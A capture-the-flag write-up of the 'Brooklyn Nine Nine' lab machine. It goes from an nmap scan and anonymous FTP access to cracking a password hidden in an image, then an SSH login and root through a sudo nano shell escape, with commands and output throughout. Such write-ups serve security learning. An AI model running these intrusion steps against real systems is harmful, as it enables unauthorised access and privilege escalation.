> Author: jak010   
> Date: 2021.05.22 

## Scan
- Command
	```sh
	$ nmap -sC -sV EXPORT_IP
	```
- Result
	```
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 08:04 UTC
	Nmap scan report for 10.10.51.198
	Host is up (0.26s latency).
	Not shown: 997 closed ports
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
	| ftp-syst:
	|   STAT:
	| FTP server status:
	|      Connected to ::ffff:10.9.26.67
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 2
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
	|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
	|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 16.89 seconds
	```

## Enumeration
- `FTP`
	- File : note_to_jake.txt
		```text
		From Amy,
		Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
		```
		-  Things
			- username : jake, amy, holt
			- Jake password's should week
- `Web`
	- File Download : `brooklyn99.jpg`
		```sh
		$ wget http://{EXPORT_IP}/brooklyn99.jpg
		```

## Steghide && StegCracker
- `stegcracker`
	```
	$ stegcracker brooklyn99.jpg PASSWORD_WORD_LIST
	```
	- Result
		```text
		Holts Password:
		fluffydog12@ninenine
		Enjoy!!
		```


## Gainig Access
- Credential
	- holt : fluffydog12@ninenine
- Command
	```sh
	$ ssh holt@EXPORT_IP
	```

## PRIVILEGE ESCALATE
- `sudo -l`
	```
	Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
	```
- Command
	```sh
	nano -s /bin/sh
	/bin/sh
	^T
	```


